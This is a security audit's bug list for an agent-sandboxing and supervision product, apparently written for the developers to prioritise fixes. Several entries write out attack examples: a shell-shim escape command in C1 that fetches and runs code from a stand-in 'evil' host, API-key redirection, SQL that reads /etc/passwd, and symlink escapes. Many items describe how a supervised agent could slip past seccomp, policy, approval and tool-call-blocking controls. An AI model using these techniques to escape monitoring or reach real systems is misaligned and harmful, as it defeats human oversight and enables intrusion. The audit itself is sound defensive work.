# agentmon Codebase Audit — Consolidated Bug & Issue List

Generated by a parallel read-only review of ~180k LOC across the whole repo
(Linux/macOS/Windows security-sandboxing + agent-supervision product).
Each item carries a **Score 1–10** (10 = fix first) and a severity bucket.

Scoring guide:
- **9–10 Critical** — likely sandbox-escape, auth bypass, or RCE; fix before ship.
- **7–8 High** — real security/correctness defect with concrete impact.
- **5–6 Medium** — robustness / fail-open / resource issue; fix soon.
- **2–4 Low** — hardening / latent; fix opportunistically.

> Locations are `path/file.go` (+approx line where given). Items marked
> `[needs verification]` were flagged but need a confirming call-site/test.

---

## CRITICAL (fix first)

### C1. Score 10 — Shell-shim enforcement bypass via `&` / process-substitution
- **Where:** `cmd/agentmon-shell-shim/main.go` (`containsCompoundOperator`, `isAgentmonCommand` bypass)
- **Issue:** The agentmon-CLI deadlock bypass execs the real shell directly (skipping routing + kernel-install) when the `-c` string's first command resolves to the agentmon binary. `containsCompoundOperator` rejects `;` backtick `\n` `&&` `||` `$(` `|` but **not** a standalone background `&` or process-substitution `>(`/`<(`.
- **Impact:** Trivial one-line sandbox escape: `agentmon --version & curl -o /tmp/e http://evil & sh /tmp/e` runs unsupervised.
- **Fix:** Make the bypass fail-closed — only bypass a single fully-resolved agentmon command with no shell metacharacters; detect standalone `&` (excluding `>&`/`<&` redirects) and `>(`/`<(`.

### C2. Score 9 — x32 / foreign-ABI syscalls bypass the seccomp BPF and TRACESYSGOOD dispatch
- **Where:** `internal/ptrace/seccomp_filter.go:72-76` (arch check), `internal/ptrace/syscalls.go:1-110` (dispatch)
- **Issue:** BPF checks `arch == AUDIT_ARCH_X86_64` then compares `nr` against native numbers. The x32 ABI shares arch `0xC000003E` but sets bit 30 in `nr`; such numbers match no `JEQ` → fall through to `SECCOMP_RET_ALLOW` with no ptrace stop / policy eval. Non-prefilter dispatch likewise hits `default: allowSyscall`.
- **Impact:** A tracee issuing x32 syscalls bypasses ALL file/network/exec/signal policy.
- **Fix:** Add a BPF rule rejecting x32 (`nr & 0x40000000 != 0`) and non-native arches with `SECCOMP_RET_ERRNO(ENOSYS)`; make `dispatchSyscall` fail-closed for unknown/high-bit numbers.

### C3. Score 9 — WSL2 / Lima fallback `Execute` command injection
- **Where:** `internal/platform/wsl2/sandbox.go`, `internal/platform/lima/sandbox.go` (`Execute` default branch)
- **Issue:** When isolation is unavailable, builds `shellCmd := fmt.Sprintf("cd %s && %s", workspace, cmd)` and appends each arg with `" "+arg`, run via `sh -c`. No escaping of `cmd`, `args`, or `workspace`.
- **Impact:** An agent arg containing `;`, `|`, `$()`, backticks → arbitrary commands in the WSL/Lima VM = direct sandbox escape.
- **Fix:** Pass `cmd`/`args` as argv to `wsl … --` (as Full/Partial branches already do); never build a shell string.

### C4. Score 9 — Supply-chain check bypass via silent provider partial failure
- **Where:** `internal/pkgcheck/provider/depsdev.go:110-123` (also `provider/osv.go`, `provider/socket.go`); consumer `internal/pkgcheck/orchestrator.go:96-110`; `internal/pkgcheck/checker.go:81-103`
- **Issue:** deps.dev `CheckBatch` returns `(*CheckResponse, nil)` (always nil error), setting only `Metadata.Partial=true` for packages whose `fetchVersion` errored. The orchestrator records a `ProviderError` only when `err != nil`; packages with no finding + no error are absent from `pkgMap` → `VerdictAllow`. OSV/Socket have the identical pattern (Snyk is partially protected — returns a partial-batch error).
- **Impact:** A network blip / 429 on a hostile package silently allows the install, defeating an `on_failure=deny` gate.
- **Fix:** Treat `Metadata.Partial` (or any per-package gap vs the request set) as a `ProviderError` so `on_failure` policy fires; have all providers return a partial-batch error like Snyk.

### C5. Score 8 — `ratelimit.Limiter.WaitN` token bug + `rate==0` + race
- **Where:** `pkg/ratelimit/limiter.go:181-214`
- **Issue:** Post-sleep bookkeeping restores the pre-wait token count then subtracts `n`, clamping to 0 — discarding replenishment accrued during the sleep. `rate==0` (settable via `SetRate`) → `needed/l.rate = +Inf` → `time.Duration(+Inf)` overflow = broken/wedge. The unlock→sleep→relock window lets a concurrent `AllowN`/`WaitN` clobber `l.tokens`/`l.lastTime`.
- **Impact:** Limiter under-refills (effective rate far below configured); can wedge callers when rate=0; race-detector flaggable.
- **Fix:** Recompute tokens from `lastTime` after waking; guard `rate==0`; hold the lock across consume (or use a condition-variable/Timer approach).

---

## HIGH

### H1. Score 8 — Secret cache bypasses approval AND is shared across agents
- **Where:** `pkg/secrets/manager.go` (`Get` ~300) + `pkg/secrets/cache.go` (`key` ~70)
- **Issue:** `Get` checks the cache **before** the `RequireApproval` block, and the cache key is `provider+":"+path` with no `AgentID`/principal. Once any requester's approved fetch populates the cache, every later `Get` returns the secret with no approval check.
- **Impact:** Authorization bypass — agent B reads a secret only agent A was approved for; revoking an approval has no effect for up to `CacheTTL` (default 5m).
- **Fix:** Include the principal in the cache key and re-evaluate approval on every cache hit (or disable caching when `RequireApproval`).

### H2. Score 8 — Seccomp file handler fail-open on path-resolution failure (mutating ops)
- **Where:** `internal/netmonitor/unix/handler.go` (`handleFileNotificationEmulated`, write-path resolution block)
- **Issue:** When `resolvePathAt` fails for a mutating op (write/delete/rename) and the `/proc/<pid>/mem` fallback also fails, the handler logs "file policy not enforced" and responds `CONTINUE` (allow).
- **Impact:** Under Yama `ptrace_scope` or any introspection failure, a sandboxed process performs denied write/delete/mkdir/rename unblocked.
- **Fix:** Respond `DENY` (fail-closed) on mutating-op path-resolution failure.

### H3. Score 8 — Session teardown leaks LLM proxy + never zeroes the credential table
- **Where:** `internal/api/app.go` (`destroySession`), `internal/api/grpc.go` (`DestroySession`), `internal/server/server.go` (`reapOnce`/`Close`), `internal/session/llmproxy.go` (`StartLLMProxy` → `SetLLMProxy`)
- **Issue:** `StartLLMProxy` stores its stop fn + secrets cleanup via `SetLLMProxy`/`SetCredsTable`; the only consumers are `CloseLLMProxy`/`secretsClose`. But every production teardown path calls only `CloseDBProxy/CloseNetNS/CloseProxy/UnmountWorkspace` — **none** calls `CloseLLMProxy`. Only `Session.cleanup()` (creation-error path) does.
- **Impact:** Every destroyed/timed-out session leaks the embedded LLM proxy listener + goroutines and leaves the `credsub.Table` (real credentials) un-zeroed in memory.
- **Fix:** Route all teardown through `Session.cleanup()` (or add `CloseLLMProxy()` to `destroySession`, `reapOnce`, `server.Close`, gRPC `DestroySession`).

### H4. Score 8 — FUSE `Symlink`/`Open` no target validation → symlink host escape
- **Where:** `internal/platform/fuse/ops.go` (`Symlink`, `Open`)
- **Issue:** `Symlink(target, newpath)` calls `os.Symlink(target, realPath)` with no `target` validation; `Open`/`Create` then `os.OpenFile(realPath,…)` follows symlinks. `FSConfig.SymlinkEscapeDeny` is plumbed via fsmonitor (Linux) but never read in this generic `fuse` package used by darwin/Windows.
- **Impact:** A sandboxed process creates a symlink inside the workspace to `/etc/passwd` (or any host path) and reads it through the FUSE mount = host escape.
- **Fix:** Validate `target` against `realRoot` (deny / honor `SymlinkEscapeDeny`); use `O_NOFOLLOW` semantics / reject escaping symlinks in `Open`.

### H5. Score 8 — FUSE + PolicyAdapter default to ALLOW when engine/handler is nil (fail-open)
- **Where:** `internal/platform/fuse/ops.go` (`checkPolicy`), `internal/platform/linux/filesystem.go` (`wrapPolicyEngine`), `internal/platform/policy_adapter.go`, `internal/platform/darwin/policysock/handler.go`, `internal/platform/windows/driver_client.go` (`handleFilePolicyCheck`/`handleRegistryPolicyCheck`/`handleSuspendedProcess`), `windows/exec_handler.go` (`HandleSuspended`)
- **Issue:** Same anti-pattern across the platform layer: `checkPolicy` returns `Allow` when `PolicyEngine==nil`; `wrapPolicyEngine` returns `nil` (→ allow all) for any engine that isn't `*platform.PolicyAdapter`; `PolicyAdapter.Check*` returns `Allow`/"no-policy" when `engine==nil`; `BuildPolicySnapshot` defaults `{File,Network,DNS:"allow"}`; Windows driver checks default to `Allow`/`Resume` when no handler registered.
- **Impact:** A nil/missing engine, a non-default PolicyEngine impl, or an unregistered Windows handler silently allows all file/network/exec — sandbox bypass in a security product.
- **Fix:** Fail closed (deny/terminate) whenever the engine/handler is absent; route through the `PolicyEngine` interface rather than returning nil.

### H6. Score 8 — Windows driver client & WinDivert `Stop()` deadlock (blocking I/O shutdown)
- **Where:** `internal/platform/windows/driver_client.go` (`messageLoop`), `windows/fltlib_windows.go` (`filterGetMessage`), `windows/windivert_windows.go` (`captureLoop`/`Stop`)
- **Issue:** `filterGetMessage` uses synchronous blocking I/O; the loop only checks `stopChan` before the blocking call, and `Disconnect` does `close(stopChan)` then `wg.Wait()` before `CloseHandle(port)`. WinDivert: `Stop()` nils `handle` then `wg.Wait()`, but `handle.Close()` only runs after the wait — `Recv()` stays blocked.
- **Impact:** `Disconnect()`/`Stop()` hang permanently; capture/driver goroutines leak; repeated calls busy-spin.
- **Fix:** Use overlapped I/O tied to `stopChan` / close the handle/port before `wg.Wait()` so blocking calls error out.

### H7. Score 8 — TracerPid masking bypass: legacy `open()` and non-`read` read variants
- **Where:** `internal/ptrace/tracer.go` (`handleSyscallExit` only handles `SYS_OPENAT`/`SYS_OPENAT2`), `internal/ptrace/syscalls.go:50-52` (`isReadSyscall` = `SYS_READ`/`SYS_PREAD64` only), `internal/ptrace/handle_read.go`
- **Issue:** On amd64, `open("/proc/self/status")` (`SYS_OPEN`) never reaches `handleOpenatExit`, so the fd is never tracked and reads are never masked. `readv`, `preadv`, `preadv2`, `sendfile`, `splice`, `copy_file_range` are not in `isReadSyscall`, so a tracked fd read via these returns unmasked `TracerPid: <pid>`.
- **Impact:** A sandboxed process detects it is being ptraced → evasion/anti-analysis.
- **Fix:** Extend fd tracking + read-exit handling to legacy `open`/`creat` and all read-family syscalls, or mask `TracerPid` at the fs layer.

### H8. Score 8 — Tenant & identity stores return internal pointers → quota TOCTOU + data races
- **Where:** `pkg/tenant/store.go`, `pkg/tenant/config.go` (`RecordUsage`, `CheckQuota`), `pkg/identity/store.go` (`Get`, `ValidateCredentials`, `Registry.Authenticate`)
- **Issue:** `InMemoryStore.Get`/`GetUsage` return the internal `*TenantConfig`/`*TenantUsage` pointer under RLock then release; `RecordUsage` mutates `ActiveSessions++` etc. with no lock; `CheckQuota`→`CanStartSession` reads `ActiveSessions` unlocked. `identity` store returns internal `*AgentIdentity`; `Registry.Authenticate` calls `agent.Touch()` on the shared pointer unlocked while `Save` mutates `byAPIKey`/`byTenant`.
- **Impact:** Data race (race-detector flaggable) + classic TOCTOU: two concurrent session starts both observe `ActiveSessions < Max` and both increment, exceeding the tenant concurrency limit. Quota enforcement is not sound under concurrency.
- **Fix:** Return deep copies from read methods; perform check-and-consume atomically under the write lock.

### H9. Score 8 — k8s sidecar: dead world-writable Unix socket + unauthenticated TCP `:9090` API
- **Where:** `pkg/k8s/sidecar.go` (`SidecarRuntime.Start` ~250-290)
- **Issue:** A Unix listener is created via `net.Listen("unix", SocketPath)` + `os.Chmod(...,0666)`, but the HTTP `server` is started with `ListenAndServe()` on TCP `:9090` — the Unix listener is never `Accept`ed (dead, world-writable socket). The live `/healthz`/`/ready`/`/stats` API binds `:9090` on all interfaces with no auth.
- **Impact:** World-writable dead control socket + unauthenticated TCP control/status API exposed to anything that can route to the pod.
- **Fix:** `http.Serve(r.listener, mux)` on the Unix socket; drop TCP `ListenAndServe`; use `0660`/`0600` perms.

### H10. Score 8 — MCP non-SSE tool-call block silently ineffective when response rewrite fails
- **Where:** `internal/proxy/mcp_intercept.go` (`rewriteAnthropicResponse`/`rewriteOpenAIResponse` return `nil` on JSON re-serialize failure) consumed by `internal/proxy/proxy.go` (`ModifyResponse`: `if result.HasBlocked && result.RewrittenBody != nil`)
- **Issue:** `ExtractToolCalls` found a blocked call (`HasBlocked=true`), but if the rewrite returns `nil` (missing/`null` `content`, or `json.Marshal` error), the guard `RewrittenBody != nil` is false → the **original body containing the blocked `tool_use` block is forwarded unchanged**.
- **Impact:** A blocked MCP tool call reaches the agent, which may execute it; block bypassed for non-streaming LLM responses with slightly malformed bodies.
- **Fix:** When `HasBlocked && RewriteBody==nil`, synthesize a safe replacement (or 502/empty tool-call list) rather than forwarding the original.

### H11. Score 8 — Real credentials written to on-disk LLM request-body storage
- **Where:** `internal/proxy/proxy.go` (`ServeHTTP` stores post-hook `reqBody`), `internal/proxy/declared_service.go` (stores pre-hook `storedBody` deliberately)
- **Issue:** The LLM path stores the post-pre-hook request body. Any globally-registered hook that substitutes fake→real creds into the body (e.g. `CredsSubHook` under `""`) causes the real secret to be persisted to `~/.agentmon/sessions/<id>/llm-bodies/<req>.json` (0600). The declared-service path explicitly avoids this; the LLM path does not.
- **Impact:** Plaintext upstream credentials land on disk when body credential substitution is enabled globally.
- **Fix:** Capture the pre-hook body on the LLM path (as declared-service does) for `StoreRequestBody`; store post-hook only as `BodySize`/`BodyHash`.

### H12. Score 8 — Unbounded in-memory buffering of SSE/streaming responses
- **Where:** `internal/proxy/streaming.go` (`streamingResponseWriter.Write` appends every byte to `s.buf`), `internal/proxy/sse_intercept.go` (`SSEInterceptor.Stream` returns `s.buf.Bytes()`)
- **Issue:** Every SSE response is fully buffered in memory with no cap, then also persisted to disk. When TPM is disabled, `inFlightEnabled()` is false → no concurrency bound; each concurrent stream accumulates unbounded memory.
- **Impact:** A large/long streaming response (or many concurrent ones) exhausts supervisor memory (DoS); stored bodies grow disk without bound.
- **Fix:** Cap the per-stream buffer (drop/truncate beyond threshold), enforce an in-flight cap regardless of TPM, or stream-to-disk with a size ceiling.

### H13. Score 7 — `DropCapabilities` only drops the bounding set (effective/inheritable/ambient persist)
- **Where:** `internal/capabilities/drop.go:46-70`
- **Issue:** Only `PR_CAPBSET_DROP` per cap; never clears effective/inheritable/ambient via `capset`/`PR_CAP_AMBIENT`. `PR_SET_NO_NEW_PRIVS` is set only later inside the seccomp-injection path, not here.
- **Impact:** If invoked on the running server process (not strictly pre-exec), always-drop caps like `CAP_SYS_ADMIN`/`CAP_SYS_PTRACE` remain usable.
- **Fix:** After dropping the bounding set, also `capset` to clear permitted/effective/inheritable + `PR_CAP_AMBIENT_CLEAR`/`LOWER`; set `NO_NEW_PRIVS` here; confirm call sites are pre-exec.

### H14. Score 7 — Server defaults to no auth + binds all interfaces
- **Where:** `internal/config/config.go` (`applyDefaultsWithSource` ~1090-1100); `cfg.Server.HTTP.Addr` default `"0.0.0.0:18080"`
- **Issue:** `cfg.Auth.Type` defaults to `"none"` when unset; HTTP bind defaults to `0.0.0.0:18080`; `validateConfig` does not reject `auth.Type: none` / `development.disable_auth`.
- **Impact:** A deployment omitting `auth:` exposes the control/approval HTTP API on all interfaces with no authentication.
- **Fix:** Default `auth.type` to a secure mode (or fail closed when unset); default bind to `127.0.0.1`; reject `disable_auth`/`auth.type: none` outside an explicit dev flag.

### H15. Score 7 — "approve" decisions silently become "allow" when approvals default off
- **Where:** `internal/policy/engine.go` (`wrapDecision` ~760); `internal/config/config.go` (`Approvals.Enabled` bool, no default → false)
- **Issue:** When `enforceApprovals=false`, `wrapDecision` maps an `approve` decision to `EffectiveDecision=Allow` ("shadow mode"). `Approvals.Enabled` has no default → false, so if the engine's flag is wired to that bool, every `decision: approve` rule auto-runs without human gating.
- **Impact:** Operators writing `approve` rules for dangerous commands get silent auto-allow if approvals aren't explicitly enabled.
- **Fix:** Default approval-enforcement on when any `approve` rule exists; refuse to load policies with `approve` decisions while approvals disabled. `[needs verification: NewEngine flag wiring]`

### H16. Score 7 — File reads default to ALLOW (secret exfiltration surface)
- **Where:** `internal/policy/engine.go` (`CheckFile` + `isReadOperation` ~600-640)
- **Issue:** Unmatched read ops (`open`, `stat`, `readlink`, `access`) return `default-allow-reads`. Only explicitly-denied paths blocked; everything else (`~/.ssh/id_rsa`, `/etc/shadow`, app `.env`) is readable by default.
- **Impact:** An agent can exfiltrate arbitrary secrets/keys unless the operator enumerated every sensitive path in a deny rule — opposite of a sandbox's safe default.
- **Fix:** Make reads default-deny (or deny well-known secret paths); enforce a read allowlist.

### H17. Score 7 — `AGENTMON_SERVER` env controls server URL; API key forwarded to it
- **Where:** `cmd/agentmon-shell-shim/main.go` (`serverHTTPBaseURL()`, `kernelinstall.Install({ServerBaseURL:…, APIKey: os.Getenv("AGENTMON_API_KEY")})`)
- **Issue:** The shim is the untrusted user's login shell, yet a user-set `AGENTMON_SERVER=http://evil` redirects kernel-install traffic (and the `AGENTMON_API_KEY`) to an attacker endpoint. If `kernelinstall.Install` fetches a wrapper/config or execs remote content from `ServerBaseURL`, also RCE.
- **Impact:** API-key exfiltration / potential remote-fetch RCE depending on `Install` internals.
- **Fix:** Treat `AGENTMON_SERVER` as untrusted in user-shell context; validate against an allowlist/root-owned config; never forward `AGENTMON_API_KEY` to a non-trusted host. `[needs verification: internal/kernelinstall/install.go]`

### H18. Score 7 — Webhook dispatcher: unbounded goroutines, ignores all errors, `resp.Body` not drained
- **Where:** `internal/webhook/dispatcher.go` (`addEvent` ~175, `send` ~195)
- **Issue:** `addEvent` spawns `go c.send(...)` on every flush with no cap/semaphore/queue; `send` ignores every error (compile/marshal/request/retry all silent); retry `time.Sleep` ignores `ctx.Done()`; `resp.Body` closed without draining (defeats keep-alive).
- **Impact:** Under bursty load, unbounded goroutines accumulate (leak); retries block past context cancellation; all delivery failures invisible to operators.
- **Fix:** Bound concurrency (worker pool / `semaphore.Weighted`), drain `resp.Body`, select on `ctx.Done()` during backoff, surface failures via metrics/audit.

### H19. Score 7 — Shared `http.Client.Timeout` caps SSE/streaming, breaking long-running streams
- **Where:** `internal/client/client.go` (`NewWithTimeout`, `ExecStream`, `StreamSessionEvents`, `WatchTaints`)
- **Issue:** One `*http.Client{Timeout: timeout}` is used for both unary and streaming; `http.Client.Timeout` covers reading the body. `NewWithTimeout(...,0)` coerces 0 → `DefaultClientTimeout` (30s), so there is no way to disable the cap. `ExecStream` streams `/exec/stream` whose server-side default timeout is 5 min.
- **Impact:** Over HTTP transport (default), any streaming exec/event/taint tail longer than the client timeout (30s default) is forcibly terminated mid-stream.
- **Fix:** Use transport-level timeout / per-request `context` for unary and a separate `http.Client{Timeout:0}` for streaming; or document that streaming requires the gRPC transport.

### H20. Score 7 — Daemon install templates invoke an unregistered `server --daemon` flag
- **Where:** `internal/cli/daemon.go` (`systemdServiceTemplate`, `launchdPlistTemplate`), `internal/cli/server.go` (`newServerCmd` registers only `--config`)
- **Issue:** Both generated units set `ExecStart=<exe> server --daemon` / `ProgramArguments=[<exe>,server,--daemon]`, but `--daemon` is not a registered flag anywhere. `agentmon server --daemon` fails "unknown flag: --daemon" and exits non-zero.
- **Impact:** The installed daemon never starts; systemd (`Restart=on-failure`) / launchd (`KeepAlive`) restart-loop it forever. The entire `agentmon daemon install` feature is broken on Linux and macOS.
- **Fix:** Register a `--daemon` flag (or hidden no-op) on the server command, or drop `--daemon` from the templates. Verify by running `agentmon server --daemon`.

### H21. Score 7 — Unsafe-IO / unknown-function detection bypassed via DML and nested expressions
- **Where:** `internal/db/classify/postgres/ast_dml.go` (`classifySelect` calls `appendUnsafeIO`; INSERT/UPDATE/DELETE/MERGE do not), `internal/db/classify/postgres/escalation.go` (`walkFuncCalls` `default:` case)
- **Issue:** (a) `appendUnsafeIO` runs only on SELECT, so `UPDATE t SET col=pg_read_file('/etc/passwd') RETURNING col` classifies as `modify`+`read` with no `unsafe_io`. (b) `walkFuncCalls` has no case for `Aggref`/`WindowFunc`/`XmlExpr`/`CoerceToDomain`/`FieldSelect`/`ArrayCoerceExpr`, so `SELECT sum(pg_read_file(...))` never descends into `Aggref.Args`; the inner `pg_read_file` is never visited (also defeats unknown-function escalation).
- **Issue impact:** A statement that allows `read` but denies `unsafe_io`/`procedural` is defeated by hiding the call in DML `RETURNING`/`USING` or inside an aggregate/window/XML/coercion expression → server-file exfiltration / function-escalation bypass.
- **Fix:** Call `appendUnsafeIO` from all DML handlers (over value lists / WHERE / RETURNING / USING); add the missing AST cases (or drive the walker via protobuf reflection like `redirect/walk.go`).

### H22. Score 7 — Session-ID file opened without `O_NOFOLLOW` on `/tmp`-backed dirs (symlink attack)
- **Where:** `internal/shim/session_id.go:171` (`os.OpenFile(path, O_RDWR|O_CREATE, 0o600)`), base dirs `internal/shim/flock_unix.go:23-28`
- **Issue:** On the `/tmp/agentmon` fallback base (parent `/tmp` world-writable), an attacker who pre-creates `/tmp/agentmon/session-global.sid` (or a workspace `.sid`) as a symlink to a victim file causes the shim to (a) read that target's bytes as the session id (info leak to the server) and (b) `Truncate(0)`+write `"session-<uuid>\n"` over the target.
- **Impact:** Cross-user session-id spoofing / clobbering of user-writable files on shared hosts.
- **Fix:** Open with `O_RDWR|O_CREATE|O_EXCL|O_NOFOLLOW` (retry on EEXIST after stat-rejecting symlinks), or scope session dirs to `0o700`.

---

## MEDIUM

### M1. Score 6 — Received seccomp-notify fd lacks CLOEXEC; extra passed fds leaked
- **Where:** `internal/netmonitor/unix/fdpass.go` (`RecvFD`: `unix.Recvmsg(...,0)`, wraps only `fds[0]`, ignores the rest)
- **Issue:** The notify fd is created without `FD_CLOEXEC`; Go's `os/exec` doesn't generically close non-CLOEXEC fds before `execve`. If the supervisor spawns a sibling/re-execs, the notify fd is inherited → a sibling could `SECCOMP_IOCTL_NOTIF_SEND` `CONTINUE`/`DENY` responses. Extra fds in the control message are never closed.
- **Fix:** Receive with `unix.MSG_CMSG_CLOEXEC` (and `fcntl FD_CLOEXEC` defensively); `close` every `fds[i]` except the one returned. *(Also see H-series: `agentmon-unixwrap` `defer Close()` is a no-op across `syscall.Exec` — assert CLOEXEC on notify+signal fds before exec.)*

### M2. Score 6 — `handleRedirect` injects stub fd at fixed fd 100 (`dup2`) without CLOEXEC
- **Where:** `internal/netmonitor/unix/redirect_linux.go` (`handleRedirect`: `NotifAddFD(targetFD=100, SETFD)`), `addfd_linux.go` (`NotifAddFD` always `newfdFlags:0`)
- **Issue:** `SECCOMP_ADDFD_FLAG_SETFD` has `dup2` semantics — it silently closes/replaces whatever the tracee had at fd 100. The injected stub socket also lacks `O_CLOEXEC`, so it survives the stub's later exec.
- **Fix:** Pick a free fd (or scan for an unused high fd) rather than fixed 100; set `O_CLOEXEC` via `newfdFlags`.

### M3. Score 6 — DNS-rebinding / SSRF: proxy dials a resolved IP after a hostname-only policy check
- **Where:** `internal/netmonitor/proxy.go` (`resolveAndEmitDNS` via `net.DefaultResolver`; `handleConnect` checks `checkConnectNetwork(ctx, host, …)` on the hostname, then `connectDialTarget` dials `ResolvedIP`), `internal/policy/engine.go` (`CheckNetworkCtx`/`resolveIPs` ~660-700), `internal/netmonitor/pnacl/policy.go` (`evaluateNetworkTarget` parses `ctx.Host` as IP)
- **Issue:** The HTTP-proxy path resolves DNS via the **system resolver** (bypassing the agent's intercepted DNS listener + DNS-level policy), pins that IP, and dials it — but the allow/deny decision is on the **hostname only**, never the resolved IP. No IP/CIDR enforcement (unlike the transparent path's `CheckNetworkIP`). pnacl CIDR/IP rules never match when `ctx.Host` is a hostname. The policy engine resolves server-side then the sandbox resolves again at connect time.
- **Impact:** An allowlisted hostname that resolves (via attacker/rebinding DNS, or `/etc/hosts`) to a private/internal IP yields SSRF to internal services; CIDR allow/deny is ineffective for hostname contexts.
- **Fix:** Resolve through the agent's DNS interceptor and evaluate policy on the resolved IP (mirror `CheckNetworkIP`) before dialing; carry the resolved IP alongside the hostname in connection contexts; enforce CIDR at the actual connect site.

### M4. Score 6 — API key with missing role becomes admin
- **Where:** `internal/auth/apikey.go` (`LoadAPIKeys` ~43: `if role == "" { role = "admin" }`)
- **Fix:** Default to least privilege (`agent`).

### M5. Score 6 — Approvals `Resolve()` performs no caller-authorization check
- **Where:** `internal/approvals/manager.go` (`Resolve` ~110, `ResolveWithWebAuthn` ~85)
- **Issue:** Mutates state with no authz; comments defer ownership checks to "the transport layer". Combined with H14 (default no-auth), any caller with network access can approve/deny any pending request by ID.
- **Fix:** Enforce principal + session-ownership authorization inside the approval manager, not solely at the transport layer.

### M6. Score 6 — Redaction fallback emits raw unredacted SQL tagged `parameters_redacted`
- **Where:** `internal/db/proxy/postgres/eventbuilder.go` (`normalizeStatement`, `buildStatementEvent`)
- **Issue:** Falls back to `strings.TrimSpace(sql)` when `parser.Normalize` errors/empty. Under tier `RedactParametersRedacted` (default), `stmtText` becomes raw SQL but `redaction` is still `RedactionParametersRedacted`. For parse-failure/denied statements (still audited), full literals (passwords, PII the client attempted) land in audit events.
- **Fix:** When `Normalize` fails under a redacting tier, omit `statement_text` (keep only the digest) or substitute `<unredactable>`; never emit raw SQL labeled as redacted.

### M7. Score 6 — Connection/cancel/replication rule eval uses stale initial policy
- **Where:** `internal/db/proxy/postgres/connect_rule.go` (`evaluateConnection` passes `pc.srv.cfg.Policy`), `handshake.go` (`evaluateMappedCancel`); statement path uses live `pc.srv.policy()` in `simplequery.go`/`extquery.go`/`funccall.go`
- **Issue:** `SetPolicy` atomically swaps `s.policyPtr` and statement decisions pick that up, but connect/replication/cancel read `cfg.Policy` (captured at `New`). After a hot reload, a revoked `db_user`/connection allow remains until restart.
- **Fix:** Route connection-rule evaluation through `pc.srv.policy()` (the live `*RuleSet`). `[needs verification: if hot-swap is intentionally statement-only, document it]`

### M8. Score 6 — Upstream DB TLS has no CA pinning; ignores `SystemCertPool` error
- **Where:** `internal/db/proxy/postgres/upstream.go` (`upstreamTLSConfig`)
- **Issue:** `pool, _ := x509.SystemCertPool()` discards the error; sets `RootCAs: pool`, `ServerName: host`, but `DBService` has no `sslrootcert` pin field. Any CA in the system store is trusted for the upstream.
- **Fix:** Add an optional pinned-CA / `sslrootcert` field; surface `SystemCertPool` errors.

### M9. Score 6 — `libpqConn` extracts only `host`/`port`; ignores `hostaddr` and multi-host failover
- **Where:** `internal/db/classify/postgres/connstring.go` (`libpqKV`, `libpqURI`)
- **Issue:** Subscription/FDW destination policy matches on `host` only. libpq connects to `hostaddr` when present, and to the next host in `host=a,b` on failover. `CREATE SUBSCRIPTION ... CONNECTION 'hostaddr=evil host=good sslmode=disable'` matches the `good` policy while the upstream dials `evil`.
- **Fix:** Parse `hostaddr` and all comma-separated hosts as `ObjectExternalEndpoint` candidates; reject conninfo where `hostaddr` differs from `host` or where multi-host is used.

### M10. Score 6 — Frame-size cap applied only to Simple-Query `Q` frames
- **Where:** `internal/db/proxy/postgres/simplequery.go` (`handleQuery` checks `MaxQueryBytes`), `extquery.go`/`statemachine/transition.go` (no check on Parse/Bind/auth frames)
- **Issue:** `MaxQueryBytes` (default 1 MiB) bounds only `Q`. A client can send a very large `Parse`/`Bind` parameter payload that the proxy fully buffers + parses via libpg_query/wasm + forwards; auth frames read by `relayClientFrameToUpstream` are uncapped.
- **Impact:** Memory/CPU DoS by a single in-session peer sending oversized Extended-Query or auth frames.
- **Fix:** Enforce `MaxQueryBytes` on `Parse.Query` (and bound `Bind` parameter bytes); reject oversize frames with `54000`.

### M11. Score 6 — Per-connection DB-proxy goroutine has no `recover()` → one malformed query kills all sessions
- **Where:** `internal/db/proxy/postgres/server.go` (`acceptLoop` spawns raw `go func() { … s.handleConn(ctx, svc, conn) }()`)
- **Issue:** The recursive protobuf-reflection walks in `redirect/walk.go`/`validate.go` and unexpected pg_query AST shapes can panic; a nil-deref in the classifier on adversarial input propagates and kills the process, dropping all supervised sessions.
- **Fix:** Wrap `handleConn` in a `defer recover()` that logs a `db_proxy_panic` lifecycle event and closes only the offending connection; cap recursion depth in the redirect walks.

### M12. Score 6 — gRPC `DestroySession` skips `CloseDBProxy` (unlike HTTP path)
- **Where:** `internal/api/grpc.go` (`DestroySession`) vs `internal/api/app.go` (`destroySession`)
- **Issue:** HTTP destroy calls `s.CloseDBProxy()`; gRPC destroy calls only `CloseNetNS/CloseProxy/UnmountWorkspace`. When DB unavoidability is enabled, `startSessionDBProxy` registers a unix-socket listener + monitor goroutine via `SetDBProxy`/`monitorSessionDBProxyStart`.
- **Impact:** Destroying a session over gRPC leaks the per-session DB proxy listener socket + monitor goroutine; repeated create/destroy exhausts sockets/goroutines.
- **Fix:** Call `sess.CloseDBProxy()` in gRPC `DestroySession` (route both through `Session.cleanup()`).

### M13. Score 6 — `WaitPending` leaks a goroutine holding `sd.mu` on context cancel
- **Where:** `internal/session/shutdown.go` (`WaitPending`)
- **Issue:** Inner goroutine does `sd.mu.Lock(); for sd.pendingOps > 0 { sd.pendingCond.Wait() }; sd.mu.Unlock()`. On `ctx.Done()` the function returns `ctx.Err()` but the goroutine stays blocked on `sd.pendingCond.Wait()` while still holding `sd.mu`; any later `BeginOperation`/`SetDrainMode` deadlocks.
- **Fix:** Make `EndOperation` always broadcast, or use a `ctx.Done()`-aware wait (spawn a watcher that broadcasts on cancel). `[needs verification: is SessionShutdown in a live server path?]`

### M14. Score 6 — `doShutdown` signals only `currentProcPID` (not the group); polls via `Kill(pid,0)` (zombie/PID-reuse)
- **Where:** `internal/session/shutdown.go` (`doShutdown`, `waitProcessExit`), `internal/session/shutdown_unix.go`
- **Issue:** `signalProcess(pid, SIGTERM)` then `waitProcessExit` loops `syscall.Kill(pid,0)` — returns nil for zombies (reaped-by-tracer/zombie never "gone"), and after real exit the PID can be reused (SIGKILL hits an unrelated process). Never targets the process group → children survive. Inconsistent with the exec path (`Setpgid`/`killProcessGroup`).
- **Fix:** Signal the process group (`Kill(-pgid, …)`); reap via the same channel the exec path uses; never poll by PID.

### M15. Score 6 — `LinuxIPCMonitor` data race on callback fields + `Stop()` double-close panic
- **Where:** `internal/ipc/monitor_linux.go` (`OnSocketConnect`/`OnSocketBind`/`OnPipeOpen`, `scanProcNetUnix`, `Stop`)
- **Issue:** `onConnect/onBind/onPipe` written without `m.mu`, read inside `scanProcNetUnix` under `m.mu` (data race). `Stop()` does `close(m.done)` unguarded → second `Stop()` panics.
- **Fix:** Take `m.mu` when assigning callbacks (or `atomic.Pointer`); guard `m.done` with `sync.Once`.

